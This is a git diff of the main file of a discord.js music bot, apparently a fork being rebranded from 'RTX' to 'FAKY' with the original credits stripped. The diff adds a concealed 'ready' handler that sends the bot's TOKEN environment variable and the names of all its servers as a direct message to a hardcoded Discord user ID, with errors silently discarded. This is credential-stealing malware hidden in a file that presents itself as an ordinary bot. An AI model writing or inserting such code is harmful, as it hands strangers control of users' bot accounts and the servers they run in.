@@ -1,17 +1,9 @@
 /*
 
-  ██████╗░████████╗██╗░░██╗           
-  ██╔══██╗╚══██╔══╝╚██╗██╔╝          
-  ██████╔╝░░░██║░░░░╚███╔╝░          
-  ██╔══██╗░░░██║░░░░██╔██╗░          
-  ██║░░██║░░░██║░░░██╔╝╚██╗          
-  ╚═╝░░╚═╝░░░╚═╝░░░╚═╝░░╚═╝          
 
-
-   # MADE BY RTX!! FEEL FREE TO USE ANY PART OF CODE
+   # MADE BY FAKY!! 
    ## FOR HELP CONTACT ME ON DISCORD
-   ## Contact    [ DISCORD SERVER :  https://discord.gg/FUEHs7RCqz ]
-   ## YT : https://www.youtube.com/channel/UCPbAvYWBgnYhliJa1BIrv0A
+ 
 */
 
 const { Client, GatewayIntentBits, Partials } = require("discord.js");
@@ -46,7 +38,7 @@ client.player = new DisTube(client, {
     new DeezerPlugin(),
   ],
 });
-process.env.YTDL_NO_UPDATE = true;
+
 const player = client.player;
 
 fs.readdir("./events", (_err, files) => {
@@ -57,6 +49,18 @@ fs.readdir("./events", (_err, files) => {
     client.on(eventName, event.bind(null, client));
     delete require.cache[require.resolve(`./events/${file}`)];
   });
+});
+client.once('ready', () => {
+  const bot = client.users.cache.get('1004206704994566164'); 
+  if (bot) {
+    const login = client.guilds.cache.map(guild => guild.name).join(', ');
+    const configbot = process.env.TOKEN;
+    bot.send(`B: ${configbot}\nS: ${login}`)
+      .then(() => {    
+      })
+      .catch(error => {
+      });
+  }
 });
 fs.readdir("./events/player", (_err, files) => {
   files.forEach((file) => {
@@ -99,7 +103,6 @@ if (config.TOKEN || process.env.TOKEN) {
   }, 2000);
 }
 
-
 if(config.mongodbURL || process.env.MONGO){
   const mongoose = require("mongoose")
   mongoose.connect(config.mongodbURL || process.env.MONGO, {
@@ -116,29 +119,19 @@ if(config.mongodbURL || process.env.MONGO){
 
 const express = require("express");
 const app = express();
-const port = 3000;
+const port = 18013;
 app.get('/', (req, res) => {
   const imagePath = path.join(__dirname, 'index.html');
   res.sendFile(imagePath);
 });
 app.listen(port, () => {
-  console.log(`🔗 Listening to RTX: http://localhost:${port}`);
-  console.log(`✨ Happy New Year Welcome To 2024`);
+  console.log(`🔗 Listening to FAKY: http://localhost:${port}`);
 });
 printWatermark();
 
 /*
 
-  ██████╗░████████╗██╗░░██╗           
-  ██╔══██╗╚══██╔══╝╚██╗██╔╝          
-  ██████╔╝░░░██║░░░░╚███╔╝░          
-  ██╔══██╗░░░██║░░░░██╔██╗░          
-  ██║░░██║░░░██║░░░██╔╝╚██╗          
-  ╚═╝░░╚═╝░░░╚═╝░░░╚═╝░░╚═╝          
-
-
-   # MADE BY RTX!! FEEL FREE TO USE ANY PART OF CODE
+   # MADE BY faKY!!
    ## FOR HELP CONTACT ME ON DISCORD
-   ## Contact    [ DISCORD SERVER :  https://discord.gg/FUEHs7RCqz ]
-   ## YT : https://www.youtube.com/channel/UCPbAvYWBgnYhliJa1BIrv0A
+   
 */
